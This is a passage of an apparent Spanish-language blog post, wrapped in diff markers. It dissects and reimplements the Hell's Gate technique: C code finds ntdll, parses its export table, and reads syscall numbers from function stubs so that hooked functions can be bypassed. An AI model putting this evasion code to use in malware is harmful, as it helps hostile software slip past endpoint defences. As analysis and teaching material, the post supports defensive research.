+</span></span><span style="display:flex;"><span>            dwModuleHash <span style="color:#f92672">=</span> dwModuleHash <span style="color:#f92672">+</span> ((<span style="color:#66d9ef">uint32_t</span>)pLdrDataTableEntry<span style="color:#f92672">-&gt;</span>BaseDllName.Buffer[i]);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> (dwRorOperations <span style="color:#f92672">&lt;</span> (dwDllNameSize <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) {
+</span></span><span style="display:flex;"><span>                dwModuleHash <span style="color:#f92672">=</span> <span style="color:#a6e22e">_rotr</span>(dwModuleHash, <span style="color:#ae81ff">0xd</span>);
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            dwRorOperations<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span><span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;[*] Found %ws (HASH: 0x%lx, ENTRY: 0x%lx)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pLdrDataTableEntry<span style="color:#f92672">-&gt;</span>BaseDllName.Buffer,
+</span></span><span style="display:flex;"><span>                                                                     dwModuleHash,
+</span></span><span style="display:flex;"><span>                                                                     (std<span style="color:#f92672">::</span><span style="color:#66d9ef">int64_t</span>)pLdrDataTableEntry);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (dwModuleHash <span style="color:#f92672">==</span> NTDLL_HASH)
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            std<span style="color:#f92672">::</span><span style="color:#a6e22e">wprintf</span>(<span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;[+] Located ntdll: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pLdrDataTableEntry);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> pLdrDataTableEntry;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="obtener-la-tabla-de-direcciones-de-exportación-eat-para-ntdll">Obtener la tabla de direcciones de exportación (EAT) para NTDLL</h2>
+<p>El paso que sigue es obtener la tabla de dirección de exportación de NTDLL.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>        PIMAGE_EXPORT_DIRECTORY pImageExportDirectory <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetImageExportDirectory</span>(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, <span style="color:#f92672">&amp;</span>pImageExportDirectory) <span style="color:#f92672">||</span> pImageExportDirectory <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x01</span>;
+</span></span></code></pre></div><p>Mirando el código, esta función fue creada por el autor de la Puerta del Infierno, vamos a mirar ese código.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetImageExportDirectory</span>(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY<span style="color:#f92672">*</span> ppImageExportDirectory) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Get DOS header
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PIMAGE_DOS_HEADER pImageDosHeader <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)pModuleBase;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (pImageDosHeader<span style="color:#f92672">-&gt;</span>e_magic <span style="color:#f92672">!=</span> IMAGE_DOS_SIGNATURE) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Get NT headers
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    PIMAGE_NT_HEADERS pImageNtHeaders <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageDosHeader<span style="color:#f92672">-&gt;</span>e_lfanew);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (pImageNtHeaders<span style="color:#f92672">-&gt;</span>Signature <span style="color:#f92672">!=</span> IMAGE_NT_SIGNATURE) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Get the EAT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#f92672">*</span>ppImageExportDirectory <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageNtHeaders<span style="color:#f92672">-&gt;</span>OptionalHeader.DataDirectory[<span style="color:#ae81ff">0</span>].VirtualAddress);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Veamos esto en WinDbg.</p>
+<p><img src="/EzekielsWheelScreenshots/eat.png" alt="alt text"></p>
+<p>Una vez que hayamos obtenido el DataDirectory podemos conseguir la dirección virtual de la tabla de dirección de exportación desde el primer índice dentro del DataDirectory. Podemos confirmar esto con <code>!dh ntdll.dll -f</code>.</p>
+<p><img src="/EzekielsWheelScreenshots/eat_addr.png" alt="alt text"></p>
+<p>Reimplementemos esto rápidamente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>VOID <span style="color:#a6e22e">GetExportAddressTable</span>(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY<span style="color:#f92672">*</span> ppImageExportDirectory)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    PIMAGE_DOS_HEADER pImageDosHeader <span style="color:#f92672">=</span> (PIMAGE_DOS_HEADER)pModuleBase;
+</span></span><span style="display:flex;"><span>    PIMAGE_NT_HEADERS pImageNtHeaders <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Verify that the DOS header is valid */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (pImageDosHeader<span style="color:#f92672">-&gt;</span>e_magic <span style="color:#f92672">!=</span> IMAGE_DOS_SIGNATURE) {
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>wcout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;[-] Failed to detect DOS header</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Get a pointer to the IMAGE_NT_HEADER structure of the module (ntdll.dll) */</span>
+</span></span><span style="display:flex;"><span>    pImageNtHeaders <span style="color:#f92672">=</span> (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageDosHeader<span style="color:#f92672">-&gt;</span>e_lfanew);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (pImageNtHeaders<span style="color:#f92672">-&gt;</span>Signature <span style="color:#f92672">!=</span> IMAGE_NT_SIGNATURE) {
+</span></span><span style="display:flex;"><span>        std<span style="color:#f92672">::</span>wcout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;[-] Failed to obtain pointer to IMAGE_NT_HEADERS</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Obtain the address of the EAT */</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>ppImageExportDirectory <span style="color:#f92672">=</span> (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageNtHeaders<span style="color:#f92672">-&gt;</span>OptionalHeader.DataDirectory[<span style="color:#ae81ff">0</span>].VirtualAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="obteniendo-entendimiento-de-getvxtableentry">Obteniendo Entendimiento de GetVxTableEntry()</h2>
+<p>El siguiente paso que vemos es una declaración de una estructura <code>VX_TABLE</code> junto con una llamada a la función <code>GetVxTableEntry()</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>        VX_TABLE Table <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>        Table.NtAllocateVirtualMemory.dwHash <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xf5bd373480a6b89b</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">GetVxTableEntry</span>(pLdrDataEntry<span style="color:#f92672">-&gt;</span>DllBase, pImageExportDirectory, <span style="color:#f92672">&amp;</span>Table.NtAllocateVirtualMemory))
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x1</span>;
+</span></span></code></pre></div><p>Analicemos la función <code>GetVxTableEntry()</code>. Estas tres primeras líneas:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetVxTableEntry</span>(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    PDWORD pdwAddressOfFunctions <span style="color:#f92672">=</span> (PDWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
+</span></span><span style="display:flex;"><span>    PDWORD pdwAddressOfNames <span style="color:#f92672">=</span> (PDWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfNames);
+</span></span><span style="display:flex;"><span>    PWORD pwAddressOfNameOrdinales <span style="color:#f92672">=</span> (PWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
+</span></span></code></pre></div><p>Lamentablemente este código no está disponible gratuitamente. Por suerte, pude encontrar la definición de la estructura en <a href="https://doxygen.reactos.org/de/d20/struct__IMAGE__EXPORT__DIRECTORY.html">ReactOS</a> y <a href="http://malwareid.in/unpack/unpacking-basics/export-address-table-and-dll-hijacking">malware.in</a>. Usando esto podemos verificar manualmente que esto sea cierto usando WinDbg.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _IMAGE_EXPORT_DIRECTORY
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    DWORD Characteristics;
+</span></span><span style="display:flex;"><span>    DWORD TimeDateStamp;
+</span></span><span style="display:flex;"><span>    WORD MajorVersion;
+</span></span><span style="display:flex;"><span>    WORD MinorVersion;
+</span></span><span style="display:flex;"><span>    DWORD Name;
+</span></span><span style="display:flex;"><span>    DWORD Base;
+</span></span><span style="display:flex;"><span>    DWORD NumberOfFunctions;
+</span></span><span style="display:flex;"><span>    DWORD NumberOfNames;
+</span></span><span style="display:flex;"><span>    PDWORD <span style="color:#f92672">*</span>AddressOfFunctions;
+</span></span><span style="display:flex;"><span>    PDWORD <span style="color:#f92672">*</span>AddressOfNames;
+</span></span><span style="display:flex;"><span>    PWORD <span style="color:#f92672">*</span>AddressOfNameOrdinals;
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>IMAGE_EXPORT_DIRECTORY, <span style="color:#f92672">*</span>PIMAGE_EXPORT_DIRECTORY;
+</span></span></code></pre></div><p>Usando esta estructura podemos comenzar a mapear cómo se usa exactamente esta estructura adentro del código maligno.</p>
+<p><img src="/EzekielsWheelScreenshots/image_export_directory_re.png" alt="alt text"></p>
+<p>Las líneas que siguen tienen un bucle interesante.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> (WORD cx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; cx <span style="color:#f92672">&lt;</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>NumberOfNames; cx<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>                PCHAR pczFunctionName <span style="color:#f92672">=</span> (PCHAR)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pdwAddressOfNames[cx]);
+</span></span><span style="display:flex;"><span>                PVOID pFunctionAddress <span style="color:#f92672">=</span> (PBYTE)pModuleBase <span style="color:#f92672">+</span> pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">djb2</span>(pczFunctionName) <span style="color:#f92672">==</span> pVxTableEntry<span style="color:#f92672">-&gt;</span>dwHash) {
+</span></span><span style="display:flex;"><span>                        pVxTableEntry<span style="color:#f92672">-&gt;</span>pAddress <span style="color:#f92672">=</span> pFunctionAddress;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">// Quick and dirty fix in case the function has been hooked
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        WORD cw <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">while</span> (TRUE) {
+</span></span><span style="display:flex;"><span>                                <span style="color:#75715e">// check if syscall, in this case we are too far
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0f</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x05</span>)
+</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#75715e">// check if ret, in this case we are also probaly too far
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc3</span>)
+</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#75715e">// First opcodes should be :
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                <span style="color:#75715e">//    MOV R10, RCX
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                <span style="color:#75715e">//    MOV RCX, &lt;syscall&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>                                        BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> cw);
+</span></span><span style="display:flex;"><span>                                        BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> cw);
+</span></span><span style="display:flex;"><span>                                        pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low;
+</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                cw<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>                        };
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><p>En breve:</p>
+<ul>
+<li>Primero, vemos que estamos iterando sobre el número de nombres en el IMAGE_EXPORT_DIRECTORY (<code>for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {</code>)</li>
+<li>Luego, iteramos sobre cada nombre de función tal como vimos en WinDBG <code>PCHAR pczFunctionName = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);</code></li>
+<li>Por último, obtenemos la dirección de la función como se vio en el código pasado <code>PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];</code></li>
+</ul>
+<p>Si reimplementamos esto en nuestro código veremos esto:</p>
+<p><img src="/EzekielsWheelScreenshots/getting_pointers.png" alt="alt text"></p>
+<p>La siguiente línea es una <code>if</code> condición. Curiosamente, vemos la introducción de una nueva función <code>djb2()</code>.</p>
+<ul>
+<li><code>if (djb2(pczFunctionName) == pVxTableEntry-&gt;dwHash) {</code></li>
+</ul>
+<p>Además, volvemos a ver nuestro dwHash. Desde mi punto de vista esto no parece ser necesario. Podemos usar cualquier función para crear la hash&hellip; pero por ahora dejaremos la función como está diseñada.</p>
+<p>El bloque de código que sigue tiene un tamaño decente, vemos algunas verificaciones y finalmente buscamos códigos de operación <code>0x4c, 0x8bx 0xd1, 0xb8, 0x00, and 0x00</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>                        pVxTableEntry<span style="color:#f92672">-&gt;</span>pAddress <span style="color:#f92672">=</span> pFunctionAddress;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                        <span style="color:#75715e">// Quick and dirty fix in case the function has been hooked
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                        WORD cw <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">while</span> (TRUE) {
+</span></span><span style="display:flex;"><span>                                <span style="color:#75715e">// check if syscall, in this case we are too far
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x0f</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x05</span>)
+</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#75715e">// check if ret, in this case we are also probaly too far
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xc3</span>)
+</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                <span style="color:#75715e">// First opcodes should be :
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                <span style="color:#75715e">//    MOV R10, RCX
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                <span style="color:#75715e">//    MOV RCX, &lt;syscall&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4c</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x8b</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xd1</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0xb8</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>
+</span></span><span style="display:flex;"><span>                                        <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span> <span style="color:#f92672">+</span> cw) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00</span>) {
+</span></span><span style="display:flex;"><span>                                        BYTE high <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">5</span> <span style="color:#f92672">+</span> cw);
+</span></span><span style="display:flex;"><span>                                        BYTE low <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>((PBYTE)pFunctionAddress <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> cw);
+</span></span><span style="display:flex;"><span>                                        pVxTableEntry<span style="color:#f92672">-&gt;</span>wSystemCall <span style="color:#f92672">=</span> (high <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">|</span> low;
+</span></span><span style="display:flex;"><span>                                        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>                                }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                cw<span style="color:#f92672">++</span>;
+</span></span></code></pre></div><p>Si miramos esto con mi herramienta <code>sickle</code> vemos que esto si es <code>mov r10, rcx</code>. Sin embargo, por el resultado, es posible que podamos simplemente usar <code>0x4c, 0x8b, and 0xd1</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wetw0rk㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/opt/Sickle/src<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 sickle.py -m asm_shell -f c 
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> ASM Shell loaded <span style="color:#66d9ef">for</span> x64 architecture
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sickle &gt; d 4c8bd1b80000
+</span></span><span style="display:flex;"><span>4c8bd1                           -&gt; mov r10, rcx
+</span></span></code></pre></div><p>Si actualizamos el código una vez más</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetVxTableEntry</span>(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    PDWORD pdwAddressOfFunctions <span style="color:#f92672">=</span> (PDWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfFunctions);
+</span></span><span style="display:flex;"><span>    PDWORD pdwAddressOfNames <span style="color:#f92672">=</span> (PDWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfNames);
+</span></span><span style="display:flex;"><span>    PWORD pwAddressOfNameOrdinales <span style="color:#f92672">=</span> (PWORD)((PBYTE)pModuleBase <span style="color:#f92672">+</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>AddressOfNameOrdinals);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    WORD cx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>    WORD cw <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x00</span>;
+</span></span><span style="display:flex;"><span>    PCHAR pczFunctionName <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    PVOID pFunctionAddress <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (cx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; cx <span style="color:#f92672">&lt;</span> pImageExportDirectory<span style="color:#f92672">-&gt;</span>NumberOfNames; cx<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    {
